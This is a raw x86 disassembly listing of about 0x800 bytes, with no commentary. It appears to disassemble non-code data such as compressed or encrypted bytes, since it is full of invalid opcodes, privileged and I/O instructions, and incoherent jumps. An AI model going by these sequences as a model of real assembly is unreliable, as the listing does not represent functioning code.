  416f4f:	dec    esi
  416f50:	cmp    BYTE PTR [edi+0x54],0x9f
  416f54:	fnstcw WORD PTR [ebx+eax*1-0x2703746a]
  416f5b:	mov    esp,0x1872d6f3
  416f60:	xor    al,BYTE PTR ds:0xaa5369
  416f66:	jns    0x416fa6
  416f68:	fwait
  416f69:	xor    DWORD PTR [eax+0x26],ebx
  416f6c:	inc    eax
  416f6d:	in     al,0x94
  416f6f:	dec    edx
  416f70:	xor    bh,BYTE PTR [eax+edx*1+0x24bd5b71]
  416f77:	and    DWORD PTR [ebx-0x3e8e8e3f],edi
  416f7d:	int3   
  416f7e:	cmp    DWORD PTR [ebp-0x33ee6358],ebp
  416f84:	sar    BYTE PTR [edi],cl
  416f86:	mov    al,0x3d
  416f88:	inc    ecx
  416f89:	(bad)  
  416f8b:	retf   0x6dcc
  416f8e:	pop    ebp
  416f8f:	(bad)  
  416f90:	mov    dl,BYTE PTR [eax]
  416f92:	sbb    bh,BYTE PTR [edi+eiz*2-0x4e]
  416f96:	and    BYTE PTR [ebx+0x6],dl
  416f99:	mov    DWORD PTR [edi-0x2daef64a],ecx
  416f9f:	jb     0x416ff2
  416fa1:	shr    edx,cl
  416fa3:	mov    cl,0xb6
  416fa5:	push   edx
  416fa6:	dec    esp
  416fa7:	dec    ebx
  416fa8:	or     ecx,edi
  416faa:	cmp    al,bl
  416fac:	clc    
  416fad:	ret    0xde6
  416fb0:	ds aas 
  416fb2:	fld    QWORD PTR [esp+esi*1]
  416fb5:	add    DWORD PTR [edi-0xf],ebx
  416fb8:	xor    eax,0x3a792f11
  416fbd:	leave  
  416fbe:	out    0x10,al
  416fc0:	adc    dl,al
  416fc2:	and    esi,DWORD PTR [eax-0x67]
  416fc5:	mov    edi,0x292cc64f
  416fca:	(bad)  
  416fcb:	mov    ds:0x78a51f85,eax
  416fd0:	push   esp
  416fd1:	inc    ebx
  416fd2:	xchg   edi,eax
  416fd3:	jo     0x416fb8
  416fd5:	rol    DWORD PTR [eax],cl
  416fd7:	test   DWORD PTR [eax+0xfe6c3f2],ebp
  416fdd:	cmp    dl,BYTE PTR [ebx-0x44]
  416fe0:	adc    al,0xd0
  416fe2:	xchg   esi,eax
  416fe3:	(bad)  
  416fe4:	push   ecx
  416fe5:	push   edi
  416fe6:	fistp  WORD PTR [ebx]
  416fe8:	pushf  
  416fe9:	cmp    DWORD PTR [edi+0x207760fd],0xffffffec
  416ff0:	lods   eax,DWORD PTR ds:[esi]
  416ff1:	or     al,0xe6
  416ff3:	leave  
  416ff4:	lods   eax,DWORD PTR ds:[esi]
  416ff5:	into   
  416ff6:	push   ebp
  416ff7:	or     eax,0x68408d1e
  416ffc:	pop    ebp
  416ffd:	jmp    0x41703d
  416fff:	lods   eax,DWORD PTR ds:[esi]
  417000:	aas    
  417001:	xor    DWORD PTR [edi+eax*8],edi
  417004:	sbb    ebp,DWORD PTR [esi-0x5b]
  417007:	adc    DWORD PTR [ebx+0x770993f3],0x6e
  41700e:	mov    dh,ah
  417010:	cwde   
  417011:	mov    eax,gs
  417013:	or     dl,bl
  417015:	xor    DWORD PTR ds:0x3348e7d7,ebx
  41701b:	and    ebp,DWORD PTR [ecx]
  41701d:	dec    edx
  41701e:	sbb    eax,0x74cffd19
  417023:	xor    esp,DWORD PTR [edx]
  417025:	scas   eax,DWORD PTR es:[edi]
  417026:	adc    eax,DWORD PTR [edi]
  417028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417029:	popa   
  41702a:	push   es
  41702b:	dec    eax
  41702c:	and    ebp,0x38
  41702f:	ins    DWORD PTR es:[edi],dx
  417030:	add    BYTE PTR [edi+0x674c7128],bh
  417036:	fisub  DWORD PTR [esi]
  417038:	push   ss
  417039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41703a:	aam    0x6a
  41703c:	push   eax
  41703d:	and    al,0x2
  41703f:	inc    ebp
  417040:	sub    DWORD PTR [esi+0x53391aa3],edx
  417046:	or     eax,0x72a63f7b
  41704b:	mov    DWORD PTR [ebx],ebp
  41704d:	jg     0x416fe1
  41704f:	fcomp  QWORD PTR [esp+ebx*1-0x44]
  417053:	sbb    al,bh
  417055:	ss adc eax,0x4dd4a55d
  41705b:	pop    ds
  41705c:	jmp    0x417012
  41705e:	adc    BYTE PTR ds:[ebp+0x7181eec4],0x3
  417066:	jo     0x417026
  417068:	cld    
  417069:	loopne 0x417065
  41706b:	(bad)  
  41706c:	sub    al,0x63
  41706e:	push   ebx
  41706f:	lods   eax,DWORD PTR ds:[esi]
  417070:	dec    esp
  417071:	inc    ecx
  417072:	adc    eax,DWORD PTR [ecx]
  417074:	or     DWORD PTR [ebp-0x10],edx
  417077:	dec    esp
  417078:	in     eax,dx
  417079:	arpl   WORD PTR [esi],si
  41707b:	xor    al,0x35
  41707d:	mov    eax,0x6c3438fa
  417082:	add    edi,DWORD PTR [edx]
  417084:	ds push 0xfffffff6
  417087:	mov    edx,0x776c41bc
  41708c:	in     al,0x1b
  41708e:	std    
  41708f:	scas   eax,DWORD PTR es:[edi]
  417090:	mov    ebp,0xe641f8cd
  417095:	rol    BYTE PTR [esp+eax*4-0x10b53c54],cl
  41709c:	sbb    edx,DWORD PTR [esp+ecx*8+0x1b384f59]
  4170a3:	inc    eax
  4170a4:	cwde   
  4170a5:	test   al,0x79
  4170a7:	or     DWORD PTR cs:[edx-0x5c],esi
  4170ab:	add    eax,DWORD PTR [eax-0x4]
  4170ae:	xchg   ecx,eax
  4170af:	xchg   DWORD PTR [edx],ebp
  4170b1:	dec    eax
  4170b2:	inc    ebx
  4170b3:	scas   eax,DWORD PTR es:[edi]
  4170b4:	scas   eax,DWORD PTR es:[edi]
  4170b5:	dec    edx
  4170b6:	xchg   DWORD PTR [eax-0x64c2276a],ebp
  4170bc:	hlt    
  4170bd:	mov    ebx,DWORD PTR [ebx+0x178226b4]
  4170c3:	sbb    eax,0xb8316202
  4170c8:	test   DWORD PTR [edx-0x5e],edx
  4170cb:	neg    al
  4170cd:	cmc    
  4170ce:	cmp    esp,DWORD PTR [esi-0x55]
  4170d1:	xchg   dh,dl
  4170d3:	retf   0xd567
  4170d6:	dec    esp
  4170d7:	out    0x4a,eax
  4170d9:	test   al,0x18
  4170db:	jo     0x417140
  4170dd:	stos   DWORD PTR es:[edi],eax
  4170de:	cwde   
  4170df:	leave  
  4170e0:	push   edi
  4170e1:	ins    DWORD PTR es:[edi],dx
  4170e2:	imul   esp,DWORD PTR [esp+esi*8+0x10f8914c],0xffffffa7
  4170ea:	add    eax,0x102ea365
  4170ef:	iret   
  4170f0:	adc    eax,0x9c44b343
  4170f5:	in     al,0xa8
  4170f7:	push   ss
  4170f8:	sub    al,0x64
  4170fa:	pusha  
  4170fb:	in     al,0x63
  4170fd:	out    0x82,eax
  4170ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417100:	or     ebx,DWORD PTR [ecx+0x47]
  417103:	test   eax,0xd3581563
  417108:	xchg   esp,eax
  417109:	sub    DWORD PTR gs:[eax],0x18
  41710d:	xor    al,0xd8
  41710f:	pop    eax
  417110:	clc    
  417111:	and    al,0x57
  417113:	sbb    cl,BYTE PTR [ecx]
  417115:	sub    al,0x9f
  417117:	popf   
  417118:	jmp    0x657bcf16
  41711d:	les    ecx,FWORD PTR [esi]
  41711f:	cmp    DWORD PTR [eax+ebx*8],0x76
  417123:	arpl   bp,sp
  417125:	gs xor eax,0xd67c399b
  41712b:	sub    ebx,edi
  41712d:	std    
  41712e:	dec    edi
  41712f:	bound  ecx,QWORD PTR [ebx-0x7f]
  417132:	jp     0x4170c3
  417134:	mov    WORD PTR [ebp-0x4d3a1dc2],?
  41713a:	inc    esp
  41713b:	xchg   esi,eax
  41713c:	or     dh,bh
  41713e:	or     edi,DWORD PTR [edi-0x60cecbaa]
  417144:	adc    al,0xca
  417146:	or     bh,BYTE PTR [esi+0x4168a46c]
  41714c:	in     al,dx
  41714d:	inc    eax
  41714e:	hlt    
  41714f:	adc    BYTE PTR [edx],0xac
  417152:	dec    esp
  417153:	dec    esi
  417154:	inc    eax
  417155:	xor    bh,BYTE PTR [ecx]
  417157:	push   ecx
  417158:	je     0x4171a4
  41715a:	push   ebp
  41715b:	dec    edx
  41715c:	out    dx,al
  41715d:	mov    ebx,0xf734ce78
  417162:	push   ss
  417163:	rcr    DWORD PTR [edi+0x68],0x42
  417167:	jmp    0x41711f
  417169:	add    BYTE PTR [edx],al
  41716b:	inc    ecx
  41716c:	push   edx
  41716d:	adc    BYTE PTR [ecx+esi*4+0x22ff6cab],dh
  417174:	imul   esi,DWORD PTR [ebx],0xffffffb8
  417177:	lds    ebp,FWORD PTR [esi]
  417179:	cmovae esi,DWORD PTR [edx-0x4a19d98e]
  417180:	jb     0x4171ce
  417182:	xor    al,0xc2
  417184:	lea    eax,[edx]
  417186:	test   BYTE PTR [edx-0x757fbb15],al
  41718c:	mov    edx,DWORD PTR [ecx+0x30]
  41718f:	loopne 0x4171d5
  417191:	cld    
  417192:	and    eax,0x128c31d2
  417197:	dec    bx
  417199:	(bad)  
  41719b:	cmp    esi,DWORD PTR [eax-0x70]
  41719e:	jns    0x4171ca
  4171a0:	cmp    eax,DWORD PTR [edx-0x45]
  4171a3:	call   0xb3c256ff
  4171a8:	xor    BYTE PTR [esi],cl
  4171aa:	mov    dl,BYTE PTR ss:[ebp+0x39]
  4171ae:	bound  edx,QWORD PTR [ecx]
  4171b0:	and    DWORD PTR [esp+ebx*8],eax
  4171b3:	jmp    0x417182
  4171b5:	mov    ch,cl
  4171b7:	fwait
  4171b8:	xor    DWORD PTR [ecx-0x3],0xb294f7fe
  4171bf:	retf   
  4171c0:	mov    WORD PTR [ecx+0x70],ds
  4171c3:	push   ebx
  4171c4:	push   eax
  4171c5:	fldenv [eax]
  4171c7:	push   ss
  4171c8:	test   eax,0x41849871
  4171cd:	stos   BYTE PTR es:[edi],al
  4171ce:	sub    dl,BYTE PTR [edx+0x41]
  4171d1:	xchg   BYTE PTR [ebp-0x1e27a7f9],bl
  4171d7:	loope  0x41724a
  4171d9:	repnz (bad) 
  4171db:	scas   al,BYTE PTR es:[edi]
  4171dc:	cli    
  4171dd:	jecxz  0x4171d0
  4171df:	xor    BYTE PTR [ebx-0x41],bl
  4171e2:	sub    dh,dl
  4171e4:	and    eax,0xc798b0d8
  4171e9:	int3   
  4171ea:	xor    al,0x4c
  4171ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171ed:	mov    dh,0x95
  4171ef:	adc    cl,BYTE PTR [ecx+ebp*1]
  4171f2:	dec    ebx
  4171f3:	cmp    ebp,DWORD PTR [ecx]
  4171f5:	xor    BYTE PTR [edi],cl
  4171f7:	ret    
  4171f8:	mov    bh,0x7e
  4171fa:	sahf   
  4171fb:	sahf   
  4171fc:	jbe    0x417262
  4171fe:	cmp    ch,BYTE PTR [esi+0x68461f77]
  417204:	daa    
  417205:	and    DWORD PTR [edi+0x18e80d01],ebx
  41720b:	sbb    ebp,DWORD PTR [eax+0x3ac537eb]
  417211:	jnp    0x417245
  417213:	out    dx,al
  417214:	add    esi,DWORD PTR [ebp+0x4b]
  417217:	jne    0x417201
  417219:	lea    esi,[esi+0x4c]
  41721c:	cmp    edi,DWORD PTR [edx+edi*2]
  41721f:	dec    edi
  417220:	cmc    
  417221:	and    dl,BYTE PTR [esi]
  417223:	sti    
  417224:	push   esp
  417225:	pop    ecx
  417226:	fwait
  417227:	sahf   
  417228:	(bad)  
  417229:	xchg   ebx,eax
  41722a:	xchg   edx,eax
  41722b:	cdq    
  41722c:	adc    eax,0xd0ee389
  417231:	jae    0x41721d
  417233:	enter  0x844d,0x99
  417237:	mov    bl,0x4f
  417239:	add    edi,DWORD PTR [esi+ecx*1-0x7e]
  41723d:	xchg   ebx,eax
  41723e:	xor    edx,ecx
  417240:	add    al,0x61
  417242:	push   ebx
  417243:	and    eax,0x477d1089
  417248:	sti    
  417249:	jl     0x41720b
  41724b:	loopne 0x417272
  41724d:	jg     0x41720a
  41724f:	adc    DWORD PTR [edi+0x118fd67e],esi
  417255:	sbb    al,0xf2
  417257:	daa    
  417258:	(bad)  
  417259:	shl    DWORD PTR [edi-0x2b],1
  41725c:	cmp    cl,BYTE PTR [eax+edi*8-0x2ab98b4]
  417263:	(bad)  
  417264:	std    
  417265:	push   es
  417266:	push   esp
  417267:	cmp    BYTE PTR [edi+0x636aeacd],cl
  41726d:	or     dl,dl
  41726f:	sub    eax,DWORD PTR [ebp+0x3d5af470]
  417275:	call   0x718d38ac
  41727a:	outs   dx,DWORD PTR ds:[esi]
  41727b:	dec    ecx
  41727c:	lds    ecx,FWORD PTR [ebx+0x1649ef36]
  417282:	xchg   ebx,eax
  417283:	push   esp
  417284:	popa   
  417285:	jb     0x41722c
  417287:	dec    esp
  417288:	sbb    dl,BYTE PTR [esp+esi*4]
  41728b:	in     eax,dx
  41728c:	add    DWORD PTR [edi],esi
  41728e:	sub    edx,DWORD PTR [ebx]
  417290:	xchg   esp,eax
  417291:	pop    ecx
  417292:	sub    bh,bh
  417294:	xor    al,BYTE PTR ds:0x97a984b8
  41729a:	mov    eax,ds:0xf26a6dbd
  41729f:	sub    al,BYTE PTR [ebp+0x53]
  4172a2:	sub    ebp,eax
  4172a4:	fcmovnbe st,st(2)
  4172a6:	push   ecx
  4172a7:	mov    al,ds:0xa5714682
  4172ac:	int    0xa2
  4172ae:	mov    ah,0xaa
  4172b0:	sbb    dl,BYTE PTR [ecx]
  4172b2:	sub    dl,BYTE PTR [ebp-0x5551483]
  4172b8:	push   ds
  4172b9:	into   
  4172ba:	shr    DWORD PTR [edx],1
  4172bc:	jp     0x4172de
  4172be:	cmc    
  4172bf:	ja     0x4172f7
  4172c1:	cmp    esi,ecx
  4172c3:	daa    
  4172c4:	jp     0x4172cb
  4172c6:	cdq    
  4172c7:	add    esi,eax
  4172c9:	pop    ebp
  4172ca:	jbe    0x41732c
  4172cc:	push   es
  4172cd:	fidiv  DWORD PTR [eax+ecx*1]
  4172d0:	sbb    dh,bh
  4172d2:	hlt    
  4172d3:	scas   al,BYTE PTR es:[edi]
  4172d4:	dec    eax
  4172d5:	adc    al,0xb6
  4172d7:	retf   0xbef7
  4172da:	mov    ebp,0x6d6b61ca
  4172df:	rsm    
  4172e1:	jg     0x417354
  4172e3:	xchg   esi,eax
  4172e4:	fstp   DWORD PTR [eax]
  4172e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172e7:	mov    al,0x6d
  4172e9:	push   ds
  4172ea:	push   bp
  4172ec:	jp     0x417294
  4172ee:	movzx  ecx,WORD PTR [eax]
  4172f1:	mov    bh,0x58
  4172f3:	sub    al,0x6b
  4172f5:	pop    ebx
  4172f6:	fcmovnbe st,st(6)
  4172f8:	or     ecx,edi
  4172fa:	mov    dh,dh
  4172fc:	scas   eax,DWORD PTR es:[edi]
  4172fd:	call   0x5ca2:0x7bc49fb3
  417304:	or     BYTE PTR [edx-0x14],dl
  417307:	xchg   BYTE PTR [edi+ebx*8+0x5311022],cl
  41730e:	icebp  
  41730f:	sbb    eax,DWORD PTR [ebp-0x1e555537]
  417315:	loop   0x417313
  417317:	imul   ecx
  417319:	outs   dx,DWORD PTR ds:[esi]
  41731a:	daa    
  41731b:	sbb    al,0xf0
  41731d:	movntq QWORD PTR [edx+edi*1],mm2
  417321:	pop    ss
  417322:	or     DWORD PTR ds:0xad493c00,eax
  417328:	jb     0x4172bb
  41732a:	hlt    
  41732b:	dec    DWORD PTR [edi-0x46]
  41732e:	xchg   esp,eax
  41732f:	sbb    eax,edx
  417331:	inc    DWORD PTR [ebx]
  417333:	aam    0x95
  417335:	popf   
  417336:	push   0xffffffa1
  417338:	loopne 0x4172e8
  41733a:	sbb    eax,0x5adac148
  41733f:	fldcw  WORD PTR [esi+0x5]
  417342:	stos   DWORD PTR es:[edi],eax
  417343:	or     al,0xa2
  417345:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417346:	test   esi,edi
  417348:	dec    ebp
  417349:	cmp    BYTE PTR [ecx-0x59e2135d],bl
  41734f:	xchg   edx,eax
  417350:	fcmovb st,st(2)
  417352:	mov    fs,WORD PTR [eax]
  417354:	in     eax,dx
  417355:	(bad)  
  417356:	fucom  st(6)
  417358:	(bad)
  41735b:	jmp    0x417355
  41735d:	lods   al,BYTE PTR ds:[esi]
  41735e:	lea    ecx,[eax]
  417360:	pop    ebx
  417361:	cmc    
  417362:	test   DWORD PTR [edi-0x179b5fe9],edx
  417368:	call   0x2d49:0x8b513f49
  41736f:	or     DWORD PTR [eax],0x7e
  417372:	dec    eax
  417373:	test   DWORD PTR [ebp-0x5a2e1af1],eax
  417379:	push   edi
  41737a:	bound  esp,QWORD PTR [ebx+0x3b443813]
  417380:	xchg   ebx,eax
  417381:	inc    ecx
  417382:	mov    dh,0x1
  417384:	mov    al,ds:0xdafc0d02
  417389:	dec    ebp
  41738a:	jns    0x41735c
  41738c:	ja     0x41736a
  41738e:	idiv   al
  417390:	cmp    bl,BYTE PTR [ebp-0x1c]
  417393:	les    edx,FWORD PTR [esi-0x2c63d734]
  417399:	std    
  41739a:	mov    edx,0x654cb2f9
  41739f:	aaa    
  4173a0:	xor    edi,0xffffffa3
  4173a3:	sub    al,0x5e
  4173a5:	loope  0x4173d9
  4173a7:	rcr    DWORD PTR [ecx+0x3b],cl
  4173aa:	add    eax,0x5b808141
  4173af:	mov    ds:0x21c228bf,eax
  4173b4:	sub    DWORD PTR [ebx],esp
  4173b6:	pop    esi
  4173b7:	test   DWORD PTR [esi-0x4e],eax
  4173ba:	fmul   QWORD PTR [ebp+edi*4-0x63ca9b61]
  4173c1:	mov    BYTE PTR ds:0x57372932,bh
  4173c7:	call   0x3e1d:0xb4f50d07
  4173ce:	popf   
  4173cf:	lds    eax,FWORD PTR [edx-0x58a0bae1]
  4173d5:	jge    0x417385
  4173d7:	sbb    eax,0x1951c32b
  4173dc:	sub    eax,0x35b930ff
  4173e1:	mov    eax,ds:0x3dbca5b
  4173e6:	dec    edi
  4173e7:	dec    ebp
  4173e8:	or     ebx,eax
  4173ea:	mov    dl,0x24
  4173ec:	loopne 0x417456
  4173ee:	das    
  4173ef:	ror    BYTE PTR [ecx+0x5a],1
  4173f2:	mov    ds:0x974cc1d0,al
  4173f7:	adc    ecx,DWORD PTR [esi]
  4173f9:	das    
  4173fa:	push   ds
  4173fb:	push   esi
  4173fc:	pop    ss
  4173fd:	rcr    DWORD PTR ds:0x38da23e9,0x57
  417404:	in     eax,dx
  417405:	xor    BYTE PTR [ebp+0x3d558e0c],dh
  41740b:	test   DWORD PTR [esi-0x47a1d6bd],ecx
  417411:	rcr    BYTE PTR [ebp+0x341088e6],0xe6
  417418:	jns    0x417469
  41741a:	sub    BYTE PTR [edi],0x3d
  41741d:	(bad)  
  41741e:	out    0xe1,eax
  417420:	add    ch,dh
  417422:	int3   
  417423:	arpl   dx,si
  417425:	shr    BYTE PTR [ecx-0x4ab46437],1
  41742b:	jp     0x4173e3
  41742d:	xor    BYTE PTR [eax+0x2ccef31a],0x4b
  417434:	jmp    0x417462
  417436:	retf   
  417437:	xchg   BYTE PTR [ebp-0x58],dl
  41743a:	adc    dh,dl
  41743c:	fcom   QWORD PTR [esi]
  41743e:	mov    ds:0x54d3aa80,eax
  417443:	and    esp,ebp
  417445:	loope  0x41740e
  417447:	pop    ss
  417448:	push   edx
  417449:	data16 xlat BYTE PTR ds:[ebx]
  41744b:	call   0xf26c:0xdef63997
  417452:	sub    al,0x4b
  417454:	ficomp WORD PTR [esi+0x6bfb6cc6]
  41745a:	xor    eax,0x3eb1a484
  41745f:	cmp    eax,0xdb31ece3
  417464:	inc    esp
  417465:	(bad)  
  417466:	dec    ebx
  417467:	sub    cl,bl
  417469:	jo     0x4174d0
  41746b:	je     0x417463
  41746d:	dec    ebp
  41746e:	stos   DWORD PTR es:[edi],eax
  41746f:	iret   
  417470:	mov    ecx,0xb90de31f
  417475:	mov    esp,0x66ee1b51
  41747a:	mov    ecx,0x56c3988f
  41747f:	ss adc ecx,ecx
  417482:	repz xchg edi,eax
  417484:	jb     0x4174e9
  417486:	ret    
  417487:	jno    0x4174be
  417489:	fisttp QWORD PTR ds:0x5b90a894
  41748f:	in     al,0x1a
  417491:	mov    es,edx
  417493:	pop    DWORD PTR [eax-0x39445bdf]
  417499:	ficomp DWORD PTR [eax+0x7d69e9ce]
  41749f:	inc    edi
  4174a0:	jecxz  0x4174cd
  4174a2:	jmp    0x41745a
  4174a4:	or     DWORD PTR [edi+0x6e9a71f0],esp
  4174aa:	jg     0x4174b4
  4174ac:	ins    DWORD PTR es:[edi],dx
  4174ad:	or     bh,BYTE PTR [edx]
  4174af:	leave  
  4174b0:	fwait
  4174b1:	adc    al,0xca
  4174b3:	pop    edi
  4174b4:	sub    bl,BYTE PTR [eax+0x5d]
  4174b7:	pop    ebp
  4174b8:	enter  0x3c62,0xb4
  4174bc:	scas   eax,DWORD PTR es:[edi]
  4174bd:	pusha  
  4174be:	adc    ebx,DWORD PTR [ecx-0x3e6fa8ee]
  4174c4:	pop    ecx
  4174c5:	jmp    0xa538ec7f
  4174ca:	out    dx,eax
  4174cb:	or     DWORD PTR [ecx],edx
  4174cd:	ins    BYTE PTR es:[edi],dx
  4174ce:	lea    ebx,[esi+0x4d2b151]
  4174d4:	retf   0xb3bd
  4174d7:	sbb    BYTE PTR [esi-0x4286ddad],ch
  4174dd:	push   ss
  4174de:	dec    edi
  4174df:	mov    ah,0x94
  4174e1:	adc    ecx,DWORD PTR [ebx+0x3f3ab4d]
  4174e7:	sbb    BYTE PTR [ebx],bh
  4174e9:	das    
  4174ea:	(bad)  
  4174eb:	sar    BYTE PTR [esi+eiz*1+0x2f],1
  4174ef:	adc    al,0x34
  4174f1:	xlat   BYTE PTR ds:[ebx]
  4174f2:	pop    ss
  4174f3:	mov    esi,0xd7b61de8
  4174f8:	inc    edi
  4174f9:	das    
  4174fa:	fcmovne st,st(7)
  4174fc:	push   eax
  4174fd:	mov    eax,0x2b04d0d2
  417502:	mov    cs,WORD PTR [ecx]
  417504:	fcmovnbe st,st(0)
  417506:	or     eax,0x50a9377a
  41750b:	or     ch,BYTE PTR [eax]
  41750d:	(bad)  
  41750e:	hlt    
  41750f:	sti    
  417510:	loope  0x4174ff
  417512:	sahf   
  417513:	sbb    edi,esi
  417515:	dec    ebx
  417516:	pop    edx
  417517:	hlt    
  417518:	stos   BYTE PTR es:[edi],al
  417519:	aad    0x9
  41751b:	jle    0x417567
  41751d:	pop    es
  41751e:	sti    
  41751f:	cs jle 0x417570
  417522:	cmp    eax,0x3cbb375e
  417527:	data16 hlt 
  417529:	or     eax,0x9069c153
  41752e:	(bad)  
  41752f:	xchg   edi,eax
  417530:	mov    BYTE PTR [edi-0x19bcb23e],ch
  417536:	xchg   esi,esi
  417538:	std    
  417539:	ins    DWORD PTR es:[edi],dx
  41753a:	imul   ecx,DWORD PTR gs:[esi-0x68],0x49
  41753f:	pop    ecx
  417540:	js     0x4175a5
  417542:	jae    0x417546
  417544:	pop    ebp
  417545:	sub    esi,ebp
  417547:	imul   edx,DWORD PTR [ecx+0x4f02c7a8],0x45f2e5c9
  417551:	addr16 mov esp,0x99b9a37b
  417557:	(bad)  
  417558:	mov    bl,0xd0
  41755a:	cwde   
  41755b:	pop    ss
  41755c:	pop    es
  41755d:	and    al,0xf6
  41755f:	mov    ds:0xed29cc96,eax
  417564:	inc    edi
  417565:	enter  0x7851,0x40
  417569:	or     dl,BYTE PTR [eax+0x22]
  41756c:	sbb    edi,DWORD PTR ds:0x5f4de620
  417572:	rcr    DWORD PTR [ebp+eiz*1-0x1457faaa],0xdb
  41757a:	push   ebp
  41757b:	jecxz  0x417514
  41757d:	shl    BYTE PTR [esi],1
  41757f:	into   
  417580:	std    
  417581:	or     dl,bh
  417583:	aam    0xd2
  417585:	imul   esi,DWORD PTR [edx],0x13
  417588:	push   esp
  417589:	nop
  41758a:	jmp    0x4175da
  41758c:	dec    ecx
  41758d:	mov    esi,ebp
  41758f:	(bad)  
  417590:	and    al,0x93
  417592:	xor    eax,0x5047f130
  417597:	pop    ebx
  417598:	push   ebp
  417599:	dec    esp
  41759a:	xor    eax,0xc94a5d95
  41759f:	sar    ah,cl
  4175a1:	repz repnz add BYTE PTR [esi*4-0x326f8eaa],0x3c
  4175ab:	sub    ah,BYTE PTR [edx-0x478c95b1]
  4175b1:	cwde   
  4175b2:	push   0xfdc90904
  4175b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175b8:	inc    esp
  4175b9:	je     0x4175a3
  4175bb:	add    eax,0x8cb09441
  4175c0:	xlat   BYTE PTR ds:[ebx]
  4175c1:	stos   DWORD PTR es:[edi],eax
  4175c2:	inc    ebx
  4175c3:	fadd   QWORD PTR [ebx+0x53272780]
  4175c9:	adc    edi,DWORD PTR [edi-0x4d]
  4175cc:	pop    edx
  4175cd:	sahf   
  4175ce:	push   ss
  4175cf:	aaa    
  4175d0:	fs in  al,dx
  4175d2:	fs xchg esp,ebx
  4175d5:	push   ss
  4175d6:	cdq    
  4175d7:	and    eax,esi
  4175d9:	out    dx,al
  4175da:	or     DWORD PTR [ebp+0x36],esp
  4175dd:	pop    ss
  4175de:	add    eax,0xe0474d61
  4175e3:	dec    edx
  4175e4:	aam    0x93
  4175e6:	jmp    0x24cf7034
  4175eb:	out    dx,eax
  4175ec:	repz leave 
  4175ee:	jno    0x417614
  4175f0:	push   ds
  4175f1:	push   edi
  4175f2:	cmp    BYTE PTR [ebp+0x22],ah
  4175f5:	jmp    0xd8a0:0x8cd0110a
  4175fc:	enter  0xf31d,0xb4
  417600:	cs lahf 
  417602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417603:	call   0xbd7fcd84
  417608:	add    eax,0xcce4454a
  41760d:	adc    eax,0x2614928c
  417612:	xor    BYTE PTR [eax],ch
  417614:	fist   WORD PTR [ecx]
  417616:	inc    esi
  417617:	pop    ebx
  417618:	mov    esi,0x14018ef2
  41761d:	xor    eax,0xd21efbac
  417622:	dec    esp
  417623:	retf   0x424d
  417626:	out    dx,al
  417627:	jmp    0x28e:0xf23e2d66
  41762e:	test   DWORD PTR [edi-0x794985fb],eax
  417634:	rep outs dx,BYTE PTR ds:[esi]
  417636:	mov    bh,0xb4
  417638:	add    al,0x5f
  41763a:	test   DWORD PTR [ecx-0x73537c67],ecx
  417640:	inc    edx
  417641:	push   es
  417642:	sub    ch,ch
  417644:	mov    ds,WORD PTR [eax]
  417646:	ret    0xd52f
  417649:	outs   dx,DWORD PTR ds:[esi]
  41764a:	xor    esp,DWORD PTR [ebp+0x69ea63fe]
  417650:	and    edi,DWORD PTR [edi-0x2f2b7d51]
  417656:	and    BYTE PTR [esi+edi*8-0x41],dh
  41765a:	jae    0x417643
  41765c:	aas    
  41765d:	pop    es
  41765e:	in     eax,dx
  41765f:	jle    0x41764a
  417661:	mov    ch,0xb7
  417663:	sub    cl,BYTE PTR [eax]
  417665:	fld    DWORD PTR [edi]
  417667:	adc    eax,0x37b1fc87
  41766c:	sbb    ebx,DWORD PTR [ecx-0x74]
  41766f:	adc    BYTE PTR [ecx],cl
  417671:	xchg   BYTE PTR [edx],dl
  417673:	push   0x1481728b
  417678:	jmp    0x4e08:0x327b2cce
  41767f:	cmc    
  417680:	mov    BYTE PTR [eax-0x25d07b44],dh
  417686:	clc    
  417687:	cmp    ch,BYTE PTR [ecx+0x30]
  41768a:	cs inc eax
  41768c:	aad    0xab
  41768e:	cld    
  41768f:	jmp    0x10ac:0xeaef371c
  417696:	jmp    0x8258a8d2
  41769b:	pop    esi
  41769c:	xchg   edi,eax
  41769d:	xchg   BYTE PTR [esi-0x44],dh
  4176a0:	daa    
  4176a1:	cmp    eax,0x7065f7f6
  4176a6:	inc    esp
  4176a7:	ret    
  4176a8:	outs   dx,BYTE PTR ds:[esi]
  4176a9:	sub    BYTE PTR [edi-0x302e32c3],dl
  4176af:	mov    al,ds:0x3682baf7
  4176b4:	(bad)  
  4176b5:	and    al,0x85
  4176b7:	push   ecx
  4176b8:	aam    0x4d
  4176ba:	rcl    DWORD PTR [edx-0x618c5ad1],1
  4176c0:	mov    ebp,0x398a2b4
  4176c5:	addr16 adc eax,0xc86f114f
  4176cb:	imul   eax,DWORD PTR [edx-0x19],0x9eefa3c9
  4176d2:	mov    WORD PTR [esi+0x1f],?
  4176d5:	mov    bl,0xe9
  4176d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176d8:	xchg   ebx,eax
  4176d9:	ja     0x4176b6
  4176db:	inc    ebp
  4176dc:	and    eax,0x96fce996
  4176e1:	loop   0x417699
  4176e3:	loopne 0x41773f
  4176e5:	into   
  4176e6:	pushf  
  4176e7:	dec    edx
  4176e8:	mov    edx,0xcf40bf10
  4176ed:	adc    DWORD PTR [edi+0x563b7041],eax
  4176f3:	sbb    bl,bh
  4176f5:	xchg   ecx,eax
  4176f6:	inc    ebp
  4176f7:	jge    0x4176d5
  4176f9:	inc    ecx
  4176fa:	or     ebx,DWORD PTR [esi+edi*2]
  4176fd:	and    eax,0xa6ebcd1f
  417702:	push   es
  417703:	shl    BYTE PTR [ecx],0xc5
  417706:	fadd   DWORD PTR [ebp+0x21]
  417709:	ja     0x4176d8
  41770b:	cmc    
  41770c:	mov    ebp,0x480ed399
  417711:	fist   WORD PTR [eax-0x36]
  417714:	scas   eax,DWORD PTR es:[edi]
  417715:	xor    ecx,DWORD PTR es:[eax*2+0x319e4387]
  41771d:	sub    eax,0xfa4d4f47
  417722:	call   0x6306:0xe8ead95c
  417729:	loop   0x417731
  41772b:	subps  xmm7,XMMWORD PTR [esi+0x72]
